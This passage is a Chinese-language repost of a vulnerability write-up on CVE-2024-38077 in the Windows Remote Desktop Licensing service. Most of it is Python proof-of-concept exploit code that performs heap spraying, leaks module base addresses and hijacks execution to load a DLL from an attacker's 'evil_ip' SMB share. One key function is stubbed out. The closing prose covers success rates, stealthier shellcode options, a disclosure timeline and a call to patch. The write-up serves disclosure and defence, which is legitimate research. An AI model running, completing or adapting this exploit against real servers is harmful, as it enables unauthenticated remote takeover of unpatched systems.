=   
bytes  
.fromhex  
("  
3048024100bf1be06ab5c535d8e30a3b3dc616ec084ff4f5b9cfb2a30695ccc6c58c37356c938d3c165d980b07882a35f22ac2e580624cc08a2a3391e5e1f608f94764b27d0203010001  
")  
  
    tls_crypt_bit_blob   
= TLSCRYPT_BIT_BLOB  
()  
  
    tls_crypt_bit_blob  
["  
cbData  
"]   
= **len**  
(pbData2  
)  
  
    tls_crypt_bit_blob  
["  
cbData  
"]   
= pbData2  
  
    tls_crypt_bit_blob  
["  
cUnusedBits  
"]   
=   
0  
  
    tls_blob2   
= TLSBLOB  
()  
  
    tls_blob2  
["  
cbData  
"]   
=   
0  
  
    tls_blob2  
["  
pbData  
"]   
=   
b  
""  
  
    tls_crypto_algorithm_identifier   
= TLSCRYPT_ALGORITHM_IDENTIFIER  
()  
  
    tls_crypto_algorithm_identifier  
["  
pszObjId  
"]   
=   
"  
1.2.840.113549.1.1.1  
\x00"  
  
    tls_crypto_algorithm_identifier  
["  
Parameters  
"]   
= tls_blob2  
  
    tls_cert_public_key_info   
= TLSCERT_PUBLIC_KEY_INFO  
()  
  
    tls_cert_public_key_info  
["  
Algorithm  
"]   
= tls_crypto_algorithm_identifier  
  
    tls_cert_public_key_info  
["  
PublicKey  
"]   
= tls_crypt_bit_blob  
  
    encryptedHwid   
=   
b  
"  
e  
"   
*   
0x  
20  
  
    hydra_cert_request   
= TLSHYDRACERTREQUEST  
()  
  
    hydra_cert_request  
["  
dwHydraVersion  
"]   
=   
0  
  
    hydra_cert_request  
["  
cbEncryptedHwid  
"]   
= **len**  
(encryptedHwid  
)  
  
    hydra_cert_request  
["  
pbEncryptedHwid  
"]   
= encryptedHwid  
  
    hydra_cert_request  
["  
szSubjectRdn  
"]   
=   
"  
bbb  
\x00"  
  
    hydra_cert_request  
["  
pSubjectPublicKeyInfo  
"]   
= tls_cert_public_key_info  
  
    dwNumCertExtension   
=   
0  
  
    hydra_cert_request  
["  
dwNumCertExtension  
"]   
= dwNumCertExtension  
  
    pbResponseData   
=   
b  
"  
a  
"   
*   
0x  
10  
  
    pbCert   
=   
b  
"  
b  
"   
*   
0x  
10  
  
    count   
=   
0  
  
      
while   
True  
:  
  
        count   
+=   
1  
  
        sleep  
(  
5  
)  
  
          
try  
:  
  
            dce  
.request  
(tls_register_LKP  
)  
  
          
except  
:  
  
              
pass  
  
        retAddr   
=   
0x  
0  
  
          
for handle   
in handle_lists  
[::-  
1  
]:  
  
              
if padding  
:  
  
                get_server_name  
["  
ctx_handle  
"]   
= handle  
  
                res_get_server_name   
= dce  
.request  
(get_server_name  
)  
  
                err_code   
= res_get_server_name  
["  
pdwErrCode  
"]  
  
                  
if   
(err_code   
==   
0  
):  
  
                      
continue  
  
            rpc_term_serv_cert   
= TLSRpcRequestTermServCert  
()  
  
            rpc_term_serv_cert  
["  
phContext  
"]   
= handle  
  
            rpc_term_serv_cert  
["  
pbRequest  
"]   
= hydra_cert_request  
  
            rpc_term_serv_cert  
["  
cbChallengeData  
"]   
=   
0x  
100  
  
            rpc_term_serv_cert  
["  
pdwErrCode  
"]   
=   
0  
  
            rpc_retrieve_serv_cert   
= TLSRpcRetrieveTermServCert  
()  
  
            rpc_retrieve_serv_cert  
["  
phContext  
"]   
= handle  
  
            rpc_retrieve_serv_cert  
["  
cbResponseData  
"]   
= **len**  
(pbResponseData  
)  
  
            rpc_retrieve_serv_cert  
["  
pbResponseData  
"]   
= pbResponseData  
  
            rpc_retrieve_serv_cert  
["  
cbCert  
"]   
= **len**  
(pbCert  
)  
  
            rpc_retrieve_serv_cert  
["  
pbCert  
"]   
= pbCert  
  
            rpc_retrieve_serv_cert  
["  
pdwErrCode  
"]   
=   
0  
  
              
try  
:  
  
                res_rpc_term_serv_cert   
= dce  
.request  
(rpc_term_serv_cert  
)  
  
                res_rpc_retrieve_serv_cert   
= dce  
.request  
(rpc_retrieve_serv_cert  
)  
  
                data   
= res_rpc_retrieve_serv_cert  
["  
pbCert  
"]  
  
                  
if   
b  
"  
n  
\x00  
c  
\x00  
a  
\x00  
c  
\x00  
n  
\x00"   
not   
in data  
:  
  
                    handle_lists  
.remove  
(handle  
)  
  
                      
if leak_idx   
==   
0  
:  
  
                          
if leakHeapBaseOffset   
!=   
0  
:  
  
                              
for i   
in **range**  
(**len**  
(data  
)   
-   
6  
):  
  
                                retAddr   
= data  
[i  
+  
4  
:i  
+  
6  
]   
+ data  
[i  
+  
2  
:i  
+  
4  
]   
+ data  
[i  
:i  
+  
2  
]  
  
                                retAddr   
= bytes_to_long  
(retAddr  
)   
- leakHeapBaseOffset  
  
                                  
if retAddr   
&   
0x  
ffff   
==   
0  
:  
  
                                    leak_idx   
= i  
  
                                    **print**  
("  
[+] Find leak_idx: 0x  
{  
:x  
}  
".format  
(leak_idx  
))  
  
                                      
return retAddr    
  
                          
else  
:  
  
                            **print**  
("  
[-] Finding leak_idx error!  
")  
  
                            **exit**  
(-  
1  
)  
  
                      
else  
:  
  
                          
if passZero  
:  
  
                            data   
= data  
[leak_idx  
:leak_idx  
+  
4  
]  
  
                            retAddr   
= data  
[  
2  
:  
4  
]   
+ data  
[  
0  
:  
2  
]  
  
                          
else  
:  
  
                            data   
= data  
[leak_idx  
:leak_idx  
+  
6  
]  
  
                            retAddr   
= data  
[  
4  
:  
6  
]   
+ data  
[  
2  
:  
4  
]   
+ data  
[  
0  
:  
2  
]  
  
                        retAddr   
= bytes_to_long  
(retAddr  
)  
  
                          
return retAddr  
  
              
except  
:  
  
                  
continue  
  
          
if leakHeapBaseOffset   
!=   
0  
:  
  
              
if count   
< **len**  
(addr  
):  
  
                targetAddr   
= addr  
[count  
]  
  
                tls_register_LKP   
= construct_overflow_arbread_buf  
(targetAddr  
, padding  
)  
  
              
else  
:  
  
                **print**  
("  
G!  
")  
  
                targetAddr   
=   
0x  
deaddeadbeefbeef  
  
                tls_register_LKP   
= construct_overflow_arbread_buf  
(targetAddr  
,   
True  
)  
  
          
if leakHeapBaseOffset   
!=   
0  
:  
  
            spray_lfh_chunk  
(  
0x  
20  
,   
0x  
800  
)  
  
          
else  
:  
  
            spray_lfh_chunk  
(  
0x  
20  
,   
0x  
400  
)  
  
        spray_handles  
(  
0x  
c00  
)  
  
        handles_free  
()  
  
def **construct_fake_obj**  
(  
heap_base  
,   
rpcrt4_base  
,   
kernelbase_base  
,   
arg1  
,   
NdrServerCall2_offset   
=   
0x  
16f50  
,   
OSF_SCALL_offset   
=   
0x  
dff10  
,   
LoadLibraryA_offset   
=   
0x  
f6de0  
):  
  
    **print**  
("  
Hidden to prevent abusing  
")  
  
    payload  
=  
0  
  
    fake_obj_addr  
=  
0  
  
      
return payload  
, fake_obj_addr  
  
def **construct_TLSRpcRegisterLicenseKeyPack**  
(  
payload  
):  
  
      
global ctx_handle  
  
    my_cert_exc   
=   
bytes  
.fromhex  
("  
308201363081e5a0030201020208019e2bfac0ae2c30300906052b0e03021d05003011310f300d06035504031e06006200620062301e170d3730303630353039323731335a170d3439303630353039323731335a3011310f300d06035504031e06006200620062305c300d06092a864886f70d0101010500034b003048024100b122dfa634ad803cbf0c1133986e7e551a036a1dfd521cd613c4972cd6f096f2a3dd0b8f80b8a26909137225134ec9d98b3acffd79c665061368c217613aba050203010001a3253023300f0603551d13040830060101ff020100301006082b06010401823712040401020300300906052b0e03021d05000341003f4ceda402ad607b9d1a38095efe25211010feb1e5a30fe5af6705c2e53a19949eaf50875e2e77c71a9b4945d631360c9dbec1f17d7e096c318547f8167d840e  
")  
  
    my_cert_sig   
=   
bytes  
.fromhex  
("  
3082036406092a864886f70d010702a0820355308203510201013100300b06092a864886f70d010701a0820339308201363081e5a0030201020208019e2bfac0ab6d10300906052b0e03021d05003011310f300d06035504031e06006200620062301e170d3730303630353039323731335a170d3439303630353039323731335a3011310f300d06035504031e06006200620062305c300d06092a864886f70d0101010500034b003048024100b122dfa634ad803cbf0c1133986e7e551a036a1dfd521cd613c4972cd6f096f2a3dd0b8f80b8a26909137225134ec9d98b3acffd79c665061368c217613aba050203010001a3253023300f0603551d13040830060101ff020100301006082b06010401823712040401020300300906052b0e03021d05000341009fd29b18115c7ef500a2ee543a4bb7528403ccb4e9fe7fe3ac2dcbf9ede68a1eca02f97c6a0f3c2384d85ab12418e523db90958978251e28d0e7903829e46723308201fb308201a9a0030201020208019e2bfac0ab6d10300906052b0e03021d05003011310f300d06035504031e06006200620062301e170d3730303630353039323731335a170d3439303630353039323731335a300d310b300906035504031302610030820122300d06092a864886f70d01010105000382010f003082010a0282010100e05a714323273db5f17c731e7db3b07397cf08a6d614484ab715793af931376622e3b86820ddb26ea763636c55092c712296da18049fd7e61b4429b1a14a85ab4567639c2d2fbc6098893ed9c553fb14f9f488f6ffa38f9ee3aaf44888981bdec21e7d617e6c7fc019e8f896098eb76470d56c4666c015f784f172aa7b4999c6fdc48e6e2a4cdaf256d69fcdd14cc82d50eb5a4e48a810679f97a5f6a933dd12e63159a72c1b3ba8c7e59af0dabdcc40f2489df6335f74614b1d2b9016644a12bce70e7470977a6e5025e9251dc4300d6ef39860cad59b06a9b81a27491e83ea826a505c3c756df9529e538259c004a832a67783893486171d3a075db49026e90203010001a3253023300f0603551d13040830060101ff020100301006082b06010401823712040401020300300906052b0e03021d05000341004b949db70bb077d19adfc707c20420afb99ae1f0a3e857ab4e3f085fe2c84b539412f4235dce03a53a43ddaa76adf7cc32e36af7b8e4e31707f881241d6bf36b3100  
")  
  
      
TEST_RSA_PUBLIC_MSKEYBLOB   
=   
bytes  
.fromhex  
("  
080200001066000020000000c61b815f961a35c688b5af232f81158c3a21f95ec897a6efa41d5b23bcf0387e  
")  
  
    data   
=   
b  
"\x00"   
*   
0x  
3c  
  
    data   
+= p32  
(**len**  
(payload  
))  
  
    data   
+= payload  
  
    data   
+=   
b  
"\x00"   
*   
0x  
10  
  
    rsa_pub_key   
= CryptImportKey  
(  
TEST_RSA_PUBLIC_MSKEYBLOB  
)  
  
    encrypted_data   
= CryptEncrypt  
(rsa_pub_key  
, data  
)  
  
    key   
=   
TEST_RSA_PUBLIC_MSKEYBLOB  
  
    data   
= encrypted_data  
  
    payload   
=   
b  
""  
  
    payload   
+= p32  
(**len**  
(key  
))  
  
    payload   
+= key  
  
    payload   
+= p32  
(**len**  
(data  
))  
  
    payload   
+= data  
  
    reg_lic_keypack   
= TLSRpcRegisterLicenseKeyPack  
()  
  
    reg_lic_keypack  
["  
lpContext  
"]   
= ctx_handle  
  
    reg_lic_keypack  
["  
arg_1  
"]   
= my_cert_sig  
  
    reg_lic_keypack  
["  
arg_2  
"]   
= **len**  
(my_cert_sig  
)  
  
    reg_lic_keypack  
["  
arg_3  
"]   
= my_cert_exc  
  
    reg_lic_keypack  
["  
arg_4  
"]   
= **len**  
(my_cert_exc  
)  
  
    reg_lic_keypack  
["  
lpKeyPackBlob  
"]   
= payload  
  
    reg_lic_keypack  
["  
arg_6  
"]   
= **len**  
(payload  
)  
  
    reg_lic_keypack  
["  
pdwErrCode  
"]   
=   
0  
  
      
return reg_lic_keypack  
  
def **construct_TLSRpcKeyPackEnumNext**  
(  
handle  
):  
  
    pLSKeyPack   
= LSKeyPack  
()  
  
    pLSKeyPack  
["  
dwVersion  
"]   
=   
1  
  
    pLSKeyPack  
["  
ucKeyPackType  
"]   
=   
1  
  
    pLSKeyPack  
["  
szCompanyName  
"]   
=   
"  
a  
"   
*   
255   
+   
"\x00"  
  
    pLSKeyPack  
["  
szKeyPackId  
"]   
=   
"  
a  
"   
*   
255   
+   
"\x00"  
  
    pLSKeyPack  
["  
szProductName  
"]   
=   
"  
a  
"   
*   
255   
+   
"\x00"  
  
    pLSKeyPack  
["  
szProductId  
"]   
=   
"  
a  
"   
*   
255   
+   
"\x00"  
  
    pLSKeyPack  
["  
szProductDesc  
"]   
=   
"  
a  
"   
*   
255   
+   
"\x00"  
  
    pLSKeyPack  
["  
wMajorVersion  
"]   
=   
1  
  
    pLSKeyPack  
["  
wMinorVersion  
"]   
=   
1  
  
    pLSKeyPack  
["  
dwPlatformType  
"]   
=   
1  
  
    pLSKeyPack  
["  
ucLicenseType  
"]   
=   
1  
  
    pLSKeyPack  
["  
dwLanguageId  
"]   
=   
1  
  
    pLSKeyPack  
["  
ucChannelOfPurchase  
"]   
=   
1  
  
    pLSKeyPack  
["  
szBeginSerialNumber  
"]   
=   
"  
a  
"   
*   
255   
+   
"\x00"  
  
    pLSKeyPack  
["  
dwTotalLicenseInKeyPack  
"]   
=   
1  
  
    pLSKeyPack  
["  
dwProductFlags  
"]   
=   
1  
  
    pLSKeyPack  
["  
dwKeyPackId  
"]   
=   
1  
  
    pLSKeyPack  
["  
ucKeyPackStatus  
"]   
=   
1  
  
    pLSKeyPack  
["  
dwActivateDate  
"]   
=   
1  
  
    pLSKeyPack  
["  
dwExpirationDate  
"]   
=   
1  
  
    pLSKeyPack  
["  
dwNumberOfLicenses  
"]   
=   
1  
  
    rpc_key_pack_enum_next   
= TLSRpcKeyPackEnumNext  
()  
  
    rpc_key_pack_enum_next  
["  
phContext  
"]   
= handle  
  
    rpc_key_pack_enum_next  
["  
lpKeyPack  
"]   
= pLSKeyPack  
  
    rpc_key_pack_enum_next  
["  
pdwErrCode  
"]   
=   
0  
  
      
return rpc_key_pack_enum_next  
  
def **hijack_rip_and_rcx**  
(  
heap_base  
,   
rpcrt4_base  
,   
kernelbase_base  
,   
arg1  
):  
  
      
global handle_lists  
, dce  
  
    payload  
, fake_obj_addr   
= construct_fake_obj  
(heap_base  
, rpcrt4_base  
, kernelbase_base  
, arg1  
)  
  
    **print**  
("  
[+] Calculate fake_obj_addr: 0x  
{  
:x  
}  
".format  
(fake_obj_addr  
))  
  
    reg_lic_keypack   
= construct_TLSRpcRegisterLicenseKeyPack  
(payload  
)  
  
    **print**  
("  
[*] Hijack rip and rcx  
")  
  
    **print**  
("  
[*] rip: kernelbase!LoadLibraryA  
")  
  
    **print**  
("  
[*] rcx:   
{0}  
".format  
(arg1  
))  
  
      
while   
True  
:  
  
        spray_fake_obj  
(reg_lic_keypack  
)  
  
        spray_lfh_chunk  
(  
0x  
20  
,   
0x  
800  
)  
  
        spray_handles  
(  
0x  
c00  
)  
  
        handles_free  
()  
  
        tls_register_LKP   
= construct_overflow_fake_obj_buf  
(fake_obj_addr  
)  
  
          
try  
:  
  
            dce  
.request  
(tls_register_LKP  
)  
  
          
except  
:  
  
              
pass  
  
        **print**  
("  
[*] Try to connect to server...  
")  
  
          
for handle   
in handle_lists  
[::-  
1  
]:  
  
            rpc_key_pack_enum_next   
= construct_TLSRpcKeyPackEnumNext  
(handle  
)  
  
              
try  
:  
  
                dce  
.request  
(rpc_key_pack_enum_next  
)  
  
              
except  
:  
  
                  
pass  
  
        **print**  
("  
[*] Check whether the exploit successed? (Y/N)  
\t")  
  
        status   
= **input**  
("  
[*]   
")  
  
          
if status   
==   
"  
Y  
"   
or status   
==   
"  
y  
":  
  
            **print**  
("  
[+] Exploit success!  
")  
  
            **exit**  
(  
0  
)  
  
def **connect_to_license_server**  
(  
target_ip  
):  
  
      
global dce  
, rpctransport  
, ctx_handle  
  
    stringbinding   
= epm  
.hept_map  
(target_ip  
,   
UUID  
,   
protocol  
="  
ncacn_ip_tcp  
")  
  
    rpctransport   
= transport  
.DCERPCTransportFactory  
(stringbinding  
)  
  
    rpctransport  
.set_connect_timeout  
(  
100  
)  
  
    dce   
= rpctransport  
.get_dce_rpc  
()  
  
    dce  
.set_auth_level  
(  
2  
)  
  
    dce  
.connect  
()  
  
    dce  
.bind  
(  
UUID  
)  
  
    rpc_conn   
= TLSRpcConnect  
()  
  
    res_rpc_conn   
= dce  
.request  
(rpc_conn  
)  
  
    ctx_handle   
= res_rpc_conn  
["  
ctx_handle  
"]  
  
    get_version   
= TLSRpcGetVersion  
()  
  
    get_version  
["  
ctx_handle  
"]   
= ctx_handle  
  
    get_version  
["  
version  
"]   
=   
3  
  
    res_get_version   
= dce  
.request  
(get_version  
)  
  
    version   
= res_get_version  
["  
version  
"]  
  
    **print**  
("  
[+] Get Server version: 0x  
{  
:x  
}  
".format  
(version  
))  
  
      
CHAL_DATA   
=   
b  
"  
a  
"   
*   
0x  
10  
  
      
RESV_DATA   
=   
b  
"  
b  
"   
*   
0x  
10  
  
    cli_chal   
= TLSCHALLENGEDATA  
()  
  
    cli_chal  
["  
dwVersion  
"]   
=   
0x  
10000  
  
    cli_chal  
["  
dwRandom  
"]   
=   
0x  
4  
  
    cli_chal  
["  
cbChallengeData  
"]   
= **len**  
(  
CHAL_DATA  
)   
+   
1  
  
    cli_chal  
["  
pbChallengeData  
"]   
=   
CHAL_DATA   
+   
b  
"\x00"  
  
    cli_chal  
["  
cbReservedData  
"]   
= **len**  
(  
RESV_DATA  
)   
+   
1  
  
    cli_chal  
["  
pbReservedData  
"]   
=   
RESV_DATA   
+   
b  
"\x00"  
  
    chal_server   
= TLSRpcChallengeServer  
()  
  
    chal_server  
["  
phContext  
"]   
= ctx_handle  
  
    chal_server  
["  
dwClientType  
"]   
=   
0  
  
    chal_server  
["  
pClientChallenge  
"]   
= cli_chal  
  
    chal_server  
["  
pdwErrCode  
"]   
=   
0  
  
    chal_response   
= dce  
.request  
(chal_server  
)  
  
    g_pszServerGuid   
=   
"  
d63a773e-6799-11d2-96ae-00c04fa3080d  
".encode  
("  
utf-16  
")[  
2  
:]  
  
    dwRandom   
= chal_response  
["  
pServerChallenge  
"]["  
dwRandom  
"]  
  
    pbChallengeData   
=   
b  
"".join  
(chal_response  
["  
pServerChallenge  
"]["  
pbChallengeData  
"])  
  
    pbResponseData   
= hashlib  
.md5  
(pbChallengeData  
[:dwRandom  
]   
+ g_pszServerGuid   
+ pbChallengeData  
[dwRandom  
:]).digest  
()  
  
    pClientResponse   
= TLSCHALLENGERESPONSEDATA  
()  
  
    pClientResponse  
["  
dwVersion  
"]   
=   
0x  
10000  
  
    pClientResponse  
["  
cbResponseData  
"]   
= **len**  
(pbResponseData  
)  
  
    pClientResponse  
["  
pbResponseData  
"]   
= pbResponseData  
  
    pClientResponse  
["  
cbReservedData  
"]   
=   
0  
  
    pClientResponse  
["  
pbReservedData  
"]   
=   
""  
  
    resp_ser_chal   
= TLSRpcResponseServerChallenge  
()  
  
    resp_ser_chal  
["  
phContext  
"]   
= ctx_handle  
  
    resp_ser_chal  
["  
pClientResponse  
"]   
= pClientResponse  
  
    resp_ser_chal  
["  
pdwErrCode  
"]   
=   
0  
  
    res_resp_ser_chal   
= dce  
.request  
(resp_ser_chal  
)  
  
def **leak_addr**  
():  
  
      
global heap_base  
, ntdll_base  
, peb_base  
, pe_base  
, rpcrt4_base  
, kernelbase_base  
  
    heap_offset_list   
=   
[  
0x  
100008  
,   
0x  
100008  
,   
0x  
400000  
,   
0x  
600000  
,   
0x  
800000  
,   
0x  
b00000  
,   
0x  
d00000  
,   
0x  
f00000  
]  
  
    heap_base   
= arb_read  
(heap_offset_list  
,   
leakHeapBaseOffset   
=   
0x  
188  
)  
  
    **print**  
("  
[+] Leak heap_base: 0x  
{  
:x  
}  
".format  
(heap_base  
))  
  
    ntdll_base   
= arb_read  
(heap_base   
+   
0x  
102048  
,   
padding   
=   
True  
)   
-   
0x  
1bd2a8  
  
    **print**  
("  
[+] Leak ntdll_base: 0x  
{  
:x  
}  
".format  
(ntdll_base  
))  
  
    tls_bit_map_addr   
= ntdll_base   
+   
0x  
1bd268  
  
    **print**  
("  
[+] Leak tls_bit_map_addr: 0x  
{  
:x  
}  
".format  
(tls_bit_map_addr  
))  
  
    peb_base   
= arb_read  
(tls_bit_map_addr  
,   
padding   
=   
True  
)   
-   
0x  
80  
  
    **print**  
("  
[+] Leak peb_base: 0x  
{  
:x  
}  
".format  
(peb_base  
))  
  
    pe_base   
= arb_read  
(peb_base   
+   
0x  
12  
,   
padding   
=   
True  
,   
passZero   
=   
True  
)   
<<   
16  
  
    **print**  
("  
[+] Leak pe_base: 0x  
{  
:x  
}  
".format  
(pe_base  
))  
  
    pe_import_table_addr   
= pe_base   
+   
0x  
10000  
  
    **print**  
("  
[+] Leak pe_import_table_addr: 0x  
{  
:x  
}  
".format  
(pe_import_table_addr  
))  
  
    rpcrt4_base   
= arb_read  
(pe_import_table_addr  
,   
padding   
=   
True  
)   
-   
0x  
a4d70  
  
    **print**  
("  
[+] Leak rpcrt4_base: 0x  
{  
:x  
}  
".format  
(rpcrt4_base  
))  
  
    rpcrt4_import_table_addr   
= rpcrt4_base   
+   
0x  
e7bf0  
  
    **print**  
("  
[+] Leak rpcrt4_import_table_addr: 0x  
{  
:x  
}  
".format  
(rpcrt4_import_table_addr  
))  
  
    kernelbase_base   
= arb_read  
(rpcrt4_import_table_addr  
,   
padding   
=   
True  
)   
-   
0x  
10aec0  
  
    **print**  
("  
[+] Leak kernelbase_base: 0x  
{  
:x  
}  
".format  
(kernelbase_base  
))  
  
def **check_vuln**  
(  
target_ip  
):  
  
    **print**  
("  
[-] Not implemented yet.  
")  
  
      
return   
True  
  
def **pwn**  
(  
target_ip  
,   
evil_ip  
,   
evil_dll_path  
,   
check_vuln_exist  
):  
  
      
global dce  
, rpctransport  
, handle_lists  
, leak_idx  
, heap_base  
, rpcrt4_base  
, kernelbase_base  
, pe_base  
, peb_base  
  
    arg1   
=   
"\\\\  
{0}{1}  
".format  
(evil_ip  
, evil_dll_path  
)  
  
    **print**  
("  
-  
"   
*   
0x  
50  
)  
  
    **print**  
(  
DESCRIPTION  
)  
  
    **print**  
("\t  
target_ip:   
{0}  
\n\t  
evil_ip:   
{1}  
\n\t  
evil_dll_path:   
{2}  
\n\t  
check_vuln_exist:   
{3}  
".format  
(target_ip  
, evil_ip  
, arg1  
, check_vuln_exist  
))  
  
      
if check_vuln_exist  
:  
  
          
if   
not check_vuln  
(target_ip  
):  
  
            **print**  
("  
[-] Failed to check for vulnerability.  
")  
  
            **exit**  
(  
0  
)  
  
          
else  
:  
  
            **print**  
("  
[+] Target exists vulnerability, try exploit...  
")  
  
      
for i   
in **range**  
(  
TRY_TIMES  
):  
  
        **print**  
("  
-  
"   
*   
0x  
50  
)  
  
        **print**  
("  
[*] Run exploit script for   
{0}  
 /   
{1}  
 times  
".format  
(i   
+   
1  
,   
TRY_TIMES  
))  
  
          
try  
:  
  
            connect_to_license_server  
(target_ip  
)  
  
            leak_addr  
()  
  
            hijack_rip_and_rcx  
(heap_base  
, rpcrt4_base  
, kernelbase_base  
, arg1  
)  
  
            dce  
.disconnect  
()  
  
            rpctransport  
.disconnect  
()  
  
          
except   
(  
ConnectionResetError  
, DCERPCException  
)   
as e  
:  
  
              
if i   
==   
TRY_TIMES   
-   
1  
:  
  
                **print**  
("  
[-] Crashed   
{0}  
 times, run exploit script failed!  
".format  
(  
TRY_TIMES  
))  
  
              
else  
:      
  
                **print**  
("  
[-] Crashed, waiting for the service to restart, need   
{0}  
 seconds...  
".format  
(  
SLEEP_TIME  
))  
  
                sleep  
(  
SLEEP_TIME  
)  
  
            handle_lists   
=   
[]  
  
            leak_idx   
=   
0  
  
              
pass    
  
if   
__name__   
==   
'  
__main__  
':  
  
    parse   
= argparse  
.ArgumentParser  
(  
description   
=   
DESCRIPTION  
)    
  
    parse  
.add_argument  
("  
--target_ip  
",   
type  
=  
str  
,   
required  
=  
True  
,   
help  
="  
Target IP, eg: 192.168.120.1  
")  
  
    parse  
.add_argument  
("  
--evil_ip  
",   
type  
=  
str  
,   
required  
=  
True  
,   
help  
="  
Evil IP, eg: 192.168.120.2  
")  
  
    parse  
.add_argument  
("  
--evil_dll_path  
",   
type  
=  
str  
,   
required  
=  
False  
,   
default  
="\\  
smb  
\\  
evil_dll.dll  
",   
help  
="  
Evil dll path, eg:   
\\  
smb  
\\  
evil_dll.dll  
")  
  
    parse  
.add_argument  
("  
--check_vuln_exist  
",   
type  
=  
bool  
,   
required  
=  
False  
,   
default  
=  
False  
,   
help  
="  
Check vulnerability exist before exploit  
")  
  
    args   
= parse  
.parse_args  
()  
  
    pwn  
(args  
.target_ip  
, args  
.evil_ip  
, args  
.evil_dll_path  
, args  
.check_vuln_exist  
)  
  
 ```  
  
**POC分析与讨论**  
  
  
我们的POC在Windows Server 2025上展现了超过95%的成功率。考虑到服务崩溃后会自动重启，且无需重复泄露模块基地址，实际成功率可能接近100%。  
  
  
在Windows Server 2025上，POC能在2分钟内完成利用过程。需要说明的是，我们目前使用的堆布局技术还未针对Windows Server 2025新引入的LFH（低碎片化堆）缓解措施进行优化。  
  
  
由于我们尚未完全解析Windows Server 2025的段堆机制，当前的堆布局方法仅是一个启发式解决方案，存在优化空间。相信经过进一步优化，漏洞利用的效率还能显著提升。  
  
  
对于Windows Server 2000到2022的版本，由于安全缓解措施相对较少，漏洞利用过程可能更为迅速。当前POC为简化演示，选择加载远程DLL，但实际上可以修改为在RDL进程中执行任意shellcode，以提高隐蔽性。  
  
  
值得注意的是，在早期Windows Server版本上利用此漏洞可能更为简单高效，但需要相应调整代码和偏移量。我们选择在最新的Windows Server 2025上进行演示，是因为它代表了当前最高级别的Windows服务器安全标准。同时，由于该版本仍处于预览阶段，我们的POC不会对实际生产环境造成影响。  
  
  
为了使漏洞利用更具通用性，可以考虑采用动态搜索方法来解决不同版本间的偏移问题。但这需要更高效的内存读取原语来保证利用效率。  
  
  
基于负责任披露原则，我们在此发布的POC仅为伪代码和未优化版本，关键部分已被隐藏。  
**然而，所提供的信息足以让安全研究人员开发出相应的检测和防御措施。**  
我们的目标是在真正的攻击出现之前，为防御者提供充足的准备时间。  
  
  
**视频演示**  
  
  
  
  
**时间线**  
  
  
▪ **2024年5月1日** 向微软报告此漏洞  
  
**▪****2024年7月1日**告知微软此漏洞可被利用  
  
**▪****2024年7月9日** 修复并编号为CVE-2024-38077（微软标记为"不太可能被利用"）  
  
**▪****2024年8月2日** 将本文发送给微软  
  
**▪****2024年8月9日** 微软未对本文作出回应  
  
**▪****2024年8月9日** 文章发布  
  
  
**开放性讨论**  
  
  
本文展示了如何利用单一漏洞突破所有安全防护，在被誉为最安全的Windows Server 2025上实现预认证远程代码执行（RCE）攻击。这一发现在2024年可能令人难以置信，但却是不争的事实。  
  
  
尽管微软几十年来不断强化Windows系统安全，我们也多年未见Windows出现预认证零点击RCE漏洞，然而我们仍能利用一个内存损坏漏洞完成如此复杂的攻击。这表明，即便是号称具有"下一代安全改进"的系统，也未能有效防御30年前就存在的经典内存利用技术。  
  
  
发布本文的主要目的是  
提醒用户及时更新系统，修复这些严重漏洞。  
值得注意的是，**在相关组件中还存在更多潜在的可利用漏洞**  
。我们已向微软报告了56个案例（尽管微软安全响应中心（SRC）将其中许多案例合并，这一点令人遗憾）。我们鼓励对此感兴趣的安全研究人员深入探索这些漏洞。  
  
  
**致谢**  
  
  
Ver (https://twitter.com/Ver0759)  
  
Lewis Lee (https://twitter.com/LewisLee53)  
  
Zhiniang Peng (https://twitter.com/edwardzpeng)  
  
  
文章来源：  
  
https://sites.google.com/site/zhiniangpeng/blogs/MadLicense  
，本文  
由网安加社区编译。  
  
  
  
**· 往期推荐 ·**  
  
1. [2024年上半年全球重大数据泄露事件盘点](http://mp.weixin.qq.com/s?__biz=Mzg4MjQ4MjM4OA==&mid=2247517346&idx=1&sn=9b82bab38f4dc88d228a34b2ab919b07&chksm=cf54c919f823400f148b4eecbec839aea5e605e4550e6916834bca7807a519f0a51399efaf8f&scene=21#wechat_redirect)  
  
  
2. [全方位揭秘：2024年巴黎奥运会网络安全防线部署](http://mp.weixin.qq.com/s?__biz=Mzg4MjQ4MjM4OA==&mid=2247517062&idx=1&sn=e83dbaee29f2e86b0f8483dc37052f8c&chksm=cf54ce3df823472bf007015b3f1e1002c7ffa950772a7c5bb4387ba3855b092eea89b88a4659&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/nmic4AsdMAVa8ichJWxZXwOeEibWSUibnn7s5IibKwr76wzB1xJGdDap8r0ibGRzPuiaPAWDQ6Jtlhibmicbp45pt2JNPmw/640?wx_fmt=gif&from=appmsg "")  
  
